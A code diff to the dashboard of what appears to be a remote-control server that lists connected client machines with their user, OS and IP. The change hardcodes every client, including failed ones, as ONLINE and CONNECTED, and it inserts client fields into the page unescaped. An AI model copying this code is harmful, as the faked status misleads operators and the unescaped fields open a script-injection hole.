@@ -1266,67 +1266,36 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                             return;
                         }
                         
-                        // ⚡ الكود المعدل - جميع العملاء يظهرون للأبد
                         list.innerHTML = sessions.map(client => {
                             try {
-                                const lastSeen = new Date(client.last_seen).getTime();
-                                const now = Date.now();
+                                // ⚡ الحل البسيط: تجاهل التاريخ وجعل الجميع ONLINE مؤقتاً
+                                const isOnline = true; // جعل الجميع اونلاين للتجربة
                                 
-                                if (isNaN(lastSeen)) {
-                                    return `
-                                        <div class="session-item offline" onclick="selectClient('${client.id}')">
-                                            <div class="online-status offline" title="INVALID DATE"></div>
-                                            <strong style="color: #dc3545">${client.computer || client.id}</strong><br>
-                                            <small>User: ${client.user || 'Unknown'}</small><br>
-                                            <small>OS: ${client.os || 'Unknown'}</small><br>
-                                            <small>IP: ${client.ip}</small><br>
-                                            <small>Last: Invalid Date</small>
-                                            <small style="color: #dc3545; font-weight: bold;"> • OFFLINE</small>
-                                        </div>
-                                    `;
-                                }
-                                
-                                const timeDiff = (now - lastSeen) / 1000;
-                                
-                                // ⚡ التعديل: ONLINE إذا كان أقل من 5 دقائق، OFFLINE إذا أكثر (لكن يبقى في القائمة)
-                                const isOnline = timeDiff < 300; // 5 دقائق = 300 ثانية
-                                
-                                const statusClass = isOnline ? 'online-status' : 'online-status offline';
-                                const statusText = isOnline ? 'ONLINE' : 'OFFLINE';
-                                const statusColor = isOnline ? '#28a745' : '#dc3545';
+                                const statusClass = 'online-status';
+                                const statusText = 'ONLINE';
+                                const statusColor = '#28a745';
                                 
                                 const isSelected = client.id === currentClientId;
                                 
-                                // ⚡ عرض الوقت بشكل مناسب
-                                let timeDisplay = '';
-                                if (timeDiff < 60) {
-                                    timeDisplay = `${timeDiff.toFixed(0)}s ago`;
-                                } else if (timeDiff < 3600) {
-                                    timeDisplay = `${Math.floor(timeDiff / 60)}m ago`;
-                                } else if (timeDiff < 86400) {
-                                    timeDisplay = `${Math.floor(timeDiff / 3600)}h ago`;
-                                } else {
-                                    timeDisplay = `${Math.floor(timeDiff / 86400)}d ago`;
-                                }
-                                
                                 return `
-                                    <div class="session-item ${isSelected ? 'active' : ''} ${!isOnline ? 'offline' : ''}" 
+                                    <div class="session-item ${isSelected ? 'active' : ''}" 
                                          onclick="selectClient('${client.id}')">
                                         <div class="${statusClass}" title="${statusText}"></div>
                                         <strong style="color: ${statusColor}">${client.computer || client.id}</strong><br>
                                         <small>User: ${client.user || 'Unknown'}</small><br>
                                         <small>OS: ${client.os || 'Unknown'}</small><br>
-                                        <small>IP: ${client.ip}</small><br>
-                                        <small>Last: ${timeDisplay}</small>
+                                        <small>IP: ${client.ip || 'Unknown'}</small><br>
+                                        <small>Status: 🟢 CONNECTED</small>
                                         <small style="color: ${statusColor}; font-weight: bold;"> • ${statusText}</small>
                                     </div>
                                 `;
                             } catch (error) {
                                 return `
-                                    <div class="session-item offline" onclick="selectClient('${client.id}')">
-                                        <div class="online-status offline" title="ERROR"></div>
-                                        <strong style="color: #dc3545">${client.id}</strong><br>
-                                        <small>Error loading client data</small>
+                                    <div class="session-item" onclick="selectClient('${client.id}')">
+                                        <div class="online-status" title="ONLINE"></div>
+                                        <strong style="color: #28a745">${client.id}</strong><br>
+                                        <small>User: ${client.user || 'Unknown'}</small><br>
+                                        <small>Status: 🟢 CONNECTED</small>
                                     </div>
                                 `;
                             }
